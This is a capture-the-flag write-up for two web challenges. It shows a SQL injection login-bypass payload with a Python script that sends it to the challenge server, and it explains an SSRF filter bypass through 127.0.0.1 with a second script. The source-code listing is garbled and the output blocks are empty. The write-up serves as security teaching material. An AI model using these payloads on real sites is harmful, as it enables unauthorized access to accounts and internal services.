I still wrote this writeup even though I only completed a few of the web challenges because I have limited time.

## Cryptid Hunters [Web]
Description: The intern found some web traffic originating from a known Consortium IP to this website. The website looks like a 7th grader's project. Most of NICC took a look at it and blew it off, but Maya thinks there may be something worth looking into. Mary and the others tell her they are too busy and it is a waste of time. She is getting pretty sick and tired of no one taking her seriously. If she finds a lead she is going to follow it. NICC needs all the help they can get, whether its a Sasquatch or a giant clam!

Link: 
> http://159.223.159.164

Flag: `NICC{1N_PuRSu1T_0F_4LL13S}`

In this challenge, we were given a website, and when we explored it, it turned out that the website had a login page on the `creatures` tab.

I tried inserting a SQL Injection login bypass payload with the following username:password
`admin' or '1'='1:admin' or '1'='1`

The payload successfully logged us in and when explored, the flag was found in Chen's description.

However, I wrote a python code to automate the process as follows:
```
import requests
from bs4 import BeautifulSoup
import re

# URL of the login page
login_url = "http://159.223.159.164/login.php"

# Form data with SQL injection credentials
login_data = {
    'username': "admin' or '1'='1",
    'password': "admin' or '1'='1"
}

# Start a session to persist cookies and session info
with requests.Session() as session:
    # Send a POST request to login
    response = session.post(login_url, data=login_data)
    
    # Check if login was successful by inspecting response content
    if response.status_code == 200:
        # Parse the response content
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Find all text starting with 'NICC{' in the response
        flag = re.search(r'NICC\{[^\}]+\}', response.text)
        
        if flag:
            print("Found the flag:", flag.group(0))
        else:
            print("No flag found in the response.")
    else:
        print("Login failed. Status code:", response.status_code)
```
This code sends a POST request to the login page with the SQL injection credentials, checks if the login successfull or not. If its success will find the text starting with `NICC\{[^\}]+\}` as a Flag format. Here are the output of the program:
```

```

## Paranormal Picture [Web]
Description: One of our recruits is a massive conspiracy theorist. Strangely enough, he has expressed not only that everything is the bite of 87 but also that there's something strange going on in the dark web that involves Dr. Tom Lei. Though he is a little bit nuts, we think he may be on to something. Figure out what's going on before it's too late!

Flag: `NICC{tHe_crYptIds_aRe_waIting_t0_sTrike}`

In this web challenge, we are given a web to upload a link.

And are also given complete source code for local testing with the following structure.

    else:

if __name__ == '__main__':
    app.run(host="::", port=80, threaded=True)
```

### Source Code Analysis and Exploitation
In the above application, there is a potential Server-Side Request Forgery (SSRF) vulnerability. SSRF is a vulnerability where an attacker can manipulate the server to make HTTP requests to specific URLs or IP addresses that may not be accessible to external users, such as `127.0.0.1` (localhost) or other internal networks. Here's the way i found and the payload that can execute `flag.html`.

Payload: `http://127.0.0.1/flag?blog=1&cryptid=1&real=1&666=1.org`

1. SSRF Analysis in `app.py`
In this application, the `verifyBlog(url)` function is used to verify whether the URL provided by the user contains certain words such as "blog", "cryptid", "real", "666", and ".org". If any of these words are missing, then the URL is considered invalid and the user is directed to resubmit the URL with the error message `"Please submit a blog!"`. After passing this verification, the application tries to fetch the content of the entered URL using `requests.get(url)`, and the result is rendered on the `index.html` page.

However, the `verifyBlog()` function does not verify the protocol (for example, ensuring that the URL actually points to an authorized external server or that it only supports HTTPS). Therefore, it only checks whether a certain substring is present in the URL without regard to the protocol or IP address.

2. Why the Payload Can Render `flag.html`
    - Passes `verifyBlog` Verification: The above URL includes all the words required by `verifyBlog` (`blog`, `cryptid`, `real`, `666`, and `.org`), even though it actually points to `127.0.0.1/flag`. 

    - Accessing Internal Endpoint `/flag`: Since the application is running on the same server, when a request is sent to `127.0.0.1`, the server makes an HTTP request to itself and accesses the `/flag` endpoint. The `127.0.0.1` address is used to access `localhost`, which should only be accessible internally.

    - Getting Contents of `flag.html`: In the `/flag` endpoint, there is an IP check to ensure that the request is coming only from `localhost` (`127.0.0.1` or `::1`). Since this payload accesses the `127.0.0.1` URL, the request is assumed to be coming from `localhost`, allowing the server to render the `flag.html` page.

Thus, the above payload allows access to `flag.html` even though the user does not directly access the `/flag` endpoint. This is possible due to the lack of protocol and domain validation in the `verifyBlog(url)` function, which opens the door to this SSRF attack.

Here are the code i wrote to automate the process:
```
import requests
import re

# Define the URL to the application's index page
index_url = "http://paranormal-picture.niccgetsspooky.xyz/"

# Define the payload with the necessary keywords
payload_url = "http://127.0.0.1/flag?blog=1&cryptid=1&real=1&666=1.org"

# Prepare the POST request data
data = {
    'url': payload_url
}

# Send a POST request to the application
response = requests.post(index_url, data=data)

# Check if the request was successful
if response.status_code == 200:
    # Search for the flag in the response text
    flag = re.search(r'NICC\{.*?\}', response.text)
    
    if flag:
        print(f"Flag found: {flag.group()}")
    else:
        print("Flag not found in the response.")
else:
    print(f"Request failed with status code: {response.status_code}")
```

And the output:
```
